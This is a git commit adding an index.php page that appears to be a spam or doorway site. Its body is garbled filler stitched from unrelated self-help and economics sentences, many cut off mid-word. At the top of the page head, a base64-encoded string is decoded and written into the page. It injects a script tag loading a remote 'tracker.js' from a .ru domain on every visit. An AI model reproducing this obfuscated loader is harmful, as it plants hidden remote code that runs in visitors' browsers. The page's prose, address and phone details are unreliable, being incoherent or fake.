302c573cbf3d1963d811c360d7448b0a7ac41b25
srwwgoht <81253240+srwwgoht@users.noreply.github.com>
2021-03-23 18:32:29 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9rbjkyNnlmamxhamltYjFiYnIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>And in accordance with his idea of ​​efficiency, the son set aside ten to fifteen minutes</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="k404rw7jmop4b4d2z1vn">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="b954u76g2ia2dz0xn4gt7hma">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>And in accordance with his idea of ​​efficiency, the son set aside ten to fifteen minutes</h1>
+	</section>
+
+
+	<section class="our-work" class="qp9nvnoanhjhi4c1k6t1141v">
+		<h3 class="title">This is a wonderful book that can change your life.</h3>
+		<p>Shortly after it got dark, the lookout reported: “Lights are straight ahead! - On the spot or moving? The captain shouted.  The third-generation value-based daily planning actually prioritizes the daily problems and crises of Squares I and III.  When we began to act from the inside out, we were able to build relationships of trust and openness and permanently eliminate deep painful contradictions that could never have been achieved by relying on the outside-in attitude.  These are strong threads that are woven into the fabric of life with precision, consistency, beauty and strength.  Of course, hard boundaries are rather arbitrary.  The oligopolistic interdependence of firms raises the rivalry between them to a qualitatively new level, turns competition into an incessant struggle. </p>
+		<hr>
+
+		<ul class="grid" class="nk9re4v7bk1pm09ebn90zwx8">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="qp9nvnoanhjhi4c1k6t1141v">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>Between stimulus and reaction is our greatest strength - freedom.  In my opinion, he is one of those who never retire.  This can take u</td>
+    <td>- But since you yourself are not talking specifically, I only have to act by exclusion.  Therefore, remember that there is al</td>
+    <td>It is associated with both production and spiritual spheres.In accordance with this, the market has the following classification: 1) according</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>- Who made up the text of this Mission? I asked.  The government constantly adjusts prices, sets limits.  This condition is called market transparency.</td>
+    <td>SUPPLY ELASTICITY Concept of supply elasticity.The sensitivity of the supply volume to changes in the market price shows the elasticity of the suppl</td>
+    <td>Why are you so sad? - Well, I don't know ...  CHANGES IN SUPPLY Changes in supply are influenced by the following factors.  - Educati</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>Now they are looking at the same facts at the same time - the combination of black lines and white space - and both accep</td>
+    <td>I mean that first you have to strive to understand, to truly understand.  Review the table in Appendix A for the different centers, </td>
+    <td>In addition, the third generation focuses on setting specific goals - long-term, intermediate and short-term, to achieve which, in harmony with values, time and en</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="k404rw7jmop4b4d2z1vn">
+		<h3 class="title">Exchange - the act of receiving a desired </h3>
+		<p>The market acts as a regulator of production, demand and supply.  - Honey, Stephen just came in for a few minutes to help us.  The same five elements that were listed there,make up the structure of Win / Win agreements between employer and employee, between independent people working together on projects, between groups of people collaborating to achieve a common goal, between companies and suppliers - between all those who need interaction to achieve a result.  Opening up and clarifying your expectations from the start is a good investment in a relationship.  - All right,dad, tired! Who needs this school! - You're tired of this.  Relationships Based on our character, we build and develop Win / Win relationships.  The results were stunning.  When these tendencies to return to old scenarios are manifested against the backdrop of emotional dependence in marriage, the vulnerability of a relationship that puts the spouse at the center becomes apparent.  A map is simply a description of certain aspects of an area.  - Exactly! And ...  If the expectations are not clear and not shared, then emotions are turned on, and a simple misunderstanding grows into a significant one and leads to a clash of characters and a breakdown in relationships.  Each of us has laid out cards on the table and plays face up.  Why can't I teach them to be independent and responsible? Or maybe it is worth looking for others who have such qualities? The Ethics of Personality tells methat I must take some decisive action - I need to shake my subordinates, to wiggle their brains, so that they get in shape and appreciate what they have. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="b954u76g2ia2dz0xn4gt7hma" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="qp9nvnoanhjhi4c1k6t1141v">
+		<h3 class="title">All four of these factors - security, focus, wisdom, and power </h3>
+		<p>- I told you, there are no feelings left! - Love her! - No, you did not understand! There is no more love! - Then love her! If the feeling is gone, then you have a good reason to love her!- But how to love if you do not love? “Look, my friend, 'love' is a verb that means action.  Forms of legal entities: commercial organizations and non-profit organizations.  This ability allows us to learn not only from our own, but also from other people's experience.  If this is so, then why then waste time and nerves on such senseless operations? A few centuries ago, economists came to the conclusion that in the conditions of voluntary and fair exchange, trade is a mutually beneficial business for its participants.At the same time, the cost side of the exchange really remains equal.  Inner focus: You make decisions that fit the needs of your job.  You can replace old, self-destructive behaviors with new ones - the skills of efficiency, happiness, and trust.  3.  And my son was playing in the park across the street. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="nk9re4v7bk1pm09ebn90zwx8" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="nk9re4v7bk1pm09ebn90zwx8" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="k404rw7jmop4b4d2z1vn">
+		<h3 class="title">- Want to see the Mission of this hotel? The direct</h3>
+		<p>But little by little our communication deepenedand we increasingly began to talk to each other about our inner world - about how we were brought up, about our life scenarios, about our feelings and doubts.  You can adapt to new conditions and be flexible.  Tell me, could you dine with the two of us to watch us talk to each other? - Well, please! - I agreed.  I mean, say, such a principle as justice, from which all our ideas about equality and justice come from.  In both cases, a sufficient supply of these much needed products drastically reduces their marginal utility and, accordingly, prices.  - As you said? You ask in amazement.  Sadat was able to use his self-awareness, imagination and conscience in order to exercise personal leadership, change the old paradigm and his vision of the situation.  People are increasingly convincing themselves of their own determinism, and they themselves create evidence to support this belief. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="b954u76g2ia2dz0xn4gt7hma" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="qp9nvnoanhjhi4c1k6t1141v">
+		<h3 class="title">We can pretend to listen: “Uh-huh! Yes Yes</h3>
+		<p>o.- the average rate of turnover (how many times a year the ruble turns around).  The power of a position is determined by the official place of the person holding it in the management structure of the organization and is measured either by the number of subordinates who are directly or indirectly obliged to obey his orders, or by the amount of material resources that this person can dispose of without the consent of others; 2) real power is the power of both office and influence and authority.  Sooner or later it will manifest itself.  How many marriages, once distinguished by excellent relationships, tenderness and sincerity, are destroyed under the influence of several such cases! The husband and wife see the situation differently.  These economic realities are influenced by many factors, and I become nervous, anxious, and aggressive towards anything that might affect them.  Let's say you are the marketing director of a large pharmaceutical firm.  This result turned out to be rallying and very enjoyable.  They produce very little and their lifestyles are not conducive to the development of their resources and means (RS) needed to achieve better results (R).  I have only one task left, and I came to ask if you or any of your employees can take the time to show me what and how to do? As a result, interns spent half a day in the units instead of two weeks.  We tend to give good advice left and right.  Both forces are real and must be considered when dealing with change.  Or, sometimes you may be comfortable with the lowest form of Win / Win approach — compromise.  It is the unique conditions of the supply of land and other natural resources that distinguish rental payments from wages,percent and profit. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="nk9re4v7bk1pm09ebn90zwx8" class="title">the right, solely at their discretion, to make legal economic d</h3>	
+		<p>Manufacturers, for their part, take targeted actions to stimulate the desire to own goods.They try to form a connection between what they release and the needs of the people.  In some ways they helped me, but, nevertheless, I cannot say that I live a happy, fruitful and calm life, as I would have liked.  Labor income is 80% of the national income.  Why it happens? I am a strong personality.  General approaches to risk management.  Such a person is devoid of power.  This was a Win / Win agreement that defined specific goals and criteria for achieving them, and defined rules, resources, accountability and consequences,which will arise if the goals are achieved.  You develop the ability to deeply understand your fundamental paradigms and values, to form a core of correct principles within yourself, to define your unique life mission,rewrite your script in such a way as to live in harmony with the correct principles and draw energy from your own internal sources.  - That's not the point at all! - I know! - said the husband, holding back with difficulty.  It took several hours, but I got a sense of clarity, a sense of organization and commitment, a sense of joy and freedom.  One of the important functions of a trademark is also advertising of manufactured products,since a trademark that has won the trust of consumers contributes to the promotion of any goods labeled with this sign.  In today's society, all goods, services, natural resources, as well as the ability of people to work acquire a monetary form.A qualitatively new role of money (as opposed to money of simply commodity production) is that it turns into money capital, or self-increasing value.  To continually move forward, we must learn, commit and act, and again recognize, commit and act, and again, recognize, commit and act.THE ASCENT SPIRAL Practical Suggestions: 1. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="k404rw7jmop4b4d2z1vn">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="b954u76g2ia2dz0xn4gt7hma"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="qp9nvnoanhjhi4c1k6t1141v"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="nk9re4v7bk1pm09ebn90zwx8"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>2512 Gregoria Mill, Apt. 501, 97514-3741, South Oranshire, New Mexico, United States</p>
+		<p>Phone number: +7(157)411-81-68553</p>
+	</footer>
+
+</body>
+
+</html>
